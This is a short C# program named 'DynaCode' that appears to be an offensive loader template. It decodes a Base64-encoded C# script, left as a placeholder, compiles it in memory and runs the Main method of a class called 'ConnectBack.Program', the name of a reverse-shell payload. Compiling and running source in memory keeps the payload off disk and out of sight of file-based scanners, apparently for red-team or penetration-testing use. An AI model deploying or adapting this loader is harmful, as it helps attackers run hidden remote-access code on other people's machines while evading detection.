using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Text;

using System.CodeDom.Compiler;
using System.IO;
using Microsoft.CSharp;
using System.Reflection;

namespace DynaCode
{
    class Program
    {
        static void Main()
        {
            string coded = "####Insert Base64 Encoded CSharp Script####";
    
            string decoded;
            
            byte[] data = System.Convert.FromBase64String(coded);
            decoded = ASCIIEncoding.ASCII.GetString(data);
            
            string[] code = {decoded};
    
            CompileAndRun(code);
    
        }
    
        static void CompileAndRun(string[] code)
        {
            CompilerParameters CompilerParams = new CompilerParameters();
            string outputDirectory = Directory.GetCurrentDirectory();
    
            CompilerParams.GenerateInMemory = true;
            CompilerParams.TreatWarningsAsErrors = false;
            CompilerParams.GenerateExecutable = false;
            CompilerParams.CompilerOptions = "";
    
            //string[] references = { "System.dll","System.Core.dll"};
            //CompilerParams.ReferencedAssemblies.AddRange(references);
            CompilerParams.ReferencedAssemblies.Add("System.dll");
            CompilerParams.ReferencedAssemblies.Add("System.Core.dll");
    
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults compile = provider.CompileAssemblyFromSource(CompilerParams, code);
    
            if (compile.Errors.HasErrors)
            {
                string text = "Compile error: ";
                foreach (CompilerError ce in compile.Errors)
                {
                    text += "rn" + ce.ToString();
                }
                throw new Exception(text);
            }
    
            Assembly assem = compile.CompiledAssembly;
            Type mt = assem.GetType("ConnectBack.Program");     
            var methInfo = mt.GetMethod("Main");
            var o = Activator.CreateInstance(mt);
            var result = methInfo.Invoke(o, null);
            
        }
    }
}
